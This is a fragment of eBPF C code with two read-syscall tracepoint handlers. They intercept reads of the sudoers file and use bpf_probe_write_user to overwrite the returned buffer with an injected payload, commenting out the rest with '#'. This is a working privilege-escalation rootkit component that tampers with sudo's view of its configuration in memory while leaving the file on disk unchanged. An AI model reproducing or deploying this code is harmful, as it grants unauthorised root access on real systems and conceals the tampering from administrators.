SEC("tp/syscalls/sys_enter_read")
int handle_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    // Check this open call is opening our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // int pid = pid_tgid >> 32;
    unsigned int* pfd = bpf_map_lookup_elem(&map_fds, &pid_tgid);
    if (pfd == 0) {
        return 0;
    }

    // Check this is the sudoers file descriptor
    unsigned int map_fd = *pfd;
    unsigned int fd = (unsigned int)ctx->args[0];
    if (map_fd != fd) {
        return 0;
    }

    // Store buffer address from arguments in map
    long unsigned int buff_addr = ctx->args[1];
    bpf_map_update_elem(&map_buff_addrs, &pid_tgid, &buff_addr, BPF_ANY);

    // log and exit
    // size_t buff_size = (size_t)ctx->args[2];
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int handle_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    // Check this open call is reading our target file
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int pid = pid_tgid >> 32;
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_buff_addrs, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }
    long unsigned int buff_addr = *pbuff_addr;
    if (buff_addr <= 0) {
        return 0;
    }

    // This is amount of data returned from the read syscall
    if (ctx->ret <= 0) {
        return 0;
    }
    long int read_size = ctx->ret;
    // long int read_size = ctx->ret;

    // Add our payload to the first line
    if (read_size < payload_len) {
        return 0;
    }

    // Overwrite first chunk of data
    // then add '#'s to comment out rest of data in the chunk.
    // This sorta corrupts the sudoers file, but everything still
    // works as expected
    char local_buff[max_payload_len] = { 0x00 };
    bpf_probe_read(&local_buff, max_payload_len, (void*)buff_addr);
    for (unsigned int i = 0; i < max_payload_len; i++) {
        if (i >= payload_len) {
            local_buff[i] = '#';
        }
        else {
            local_buff[i] = payload[i];
        }
    }
    // Write data back to buffer
    long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);
    // long ret = bpf_probe_write_user((void*)buff_addr, local_buff, max_payload_len);

    // Send event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(struct event*), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = pid;
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }
    return 0;
}